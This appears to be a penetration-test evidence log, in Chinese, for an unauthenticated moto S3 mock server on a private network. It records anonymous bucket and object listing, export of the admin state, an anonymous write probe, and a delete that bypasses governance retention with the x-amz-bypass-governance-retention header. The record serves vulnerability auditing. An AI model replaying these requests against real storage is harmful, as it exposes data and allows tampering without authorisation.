@@ -1,0 +1,35 @@
+### 未认证 AWS 控制面（moto S3 模拟）暴露 —— 复现证据
+### 目标: http://192.168.188.x:5000      时间: 2026-09-18 10:28:13
+### 全部请求均无任何凭据（无 Authorization 头 / 无 Cookie）
+------------------------------------------------------------------------------
+[1] GET /  -> HTTP 200  Server=amazon.com  CT=application/xml
+    匿名取得桶列表: ['windmill-volumes']   Owner.ID=['bcaf1ffd86f41161ca5fb16fd081034f']
+    原始响应: <?xml version="1.0" encoding="utf-8"?> <ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Buckets><Bucket><Name>windmill-volumes</Name><CreationDate>2026-09-18T02:25:45.000Z</CreationDate></Bucket><
+------------------------------------------------------------------------------
+[2] GET /windmill-volumes?list-type=2 -> HTTP 200  Server=amazon.com
+    匿名列出对象 2 个：
+       volumes/demo/libvol/__pycache__/mymod.cpython-312.pyc        419 bytes
+       volumes/demo/libvol/mymod.py                                 90 bytes
+------------------------------------------------------------------------------
+[3] GET /moto-api/data.json -> HTTP 200  len=15124
+    后端服务状态被匿名导出，服务: ['cloudwatch', 'core', 'events', 'iam', 's3', 'sts']
+    GET /moto-api/ (管理 UI) -> HTTP 200
+------------------------------------------------------------------------------
+[4] 对象级请求（经前置 Werkzeug 网关）权限矩阵
+    GET    /windmill-volumes/<existing-key>                         -> HTTP 403  Server=Werkzeug/3.1.5 Python/3.13.12
+    DELETE /windmill-volumes/audit-nonexistent                      -> HTTP 204
+------------------------------------------------------------------------------
+[5] 匿名写测试
+    PUT /windmill-volumes/audit-probe.txt -> HTTP 200  写被接受
+    对象清单已含探针: True
+    DELETE（普通） -> HTTP 403  ← 被治理保留拦下
+    DELETE + x-amz-bypass-governance-retention:true -> HTTP 204  ← 保留保护被绕过
+    清理后对象清单: ['volumes/demo/libvol/__pycache__/mymod.cpython-312.pyc', 'volumes/demo/libvol/mymod.py']  => ✅ 已还原
+------------------------------------------------------------------------------
+[6] 判定
+    ✅ 未认证暴露成立：零凭据可列桶、列对象、读取 moto 管理面状态导出
+       认证边界：**pre-auth**（无任何凭据）
+       影响：泄露对象键与内部卷路径；配合前置网关的匿名 PUT 能力可对存储做写入/篡改
+       性质：部署配置暴露（非产品 CVE）；该机疑为靶场自身的基准测试载体
+
+(证据已写入 /home/duskto/test_vul/moto-aws-mock-192.168.188.x/evidence/moto-unauth-s3.txt)
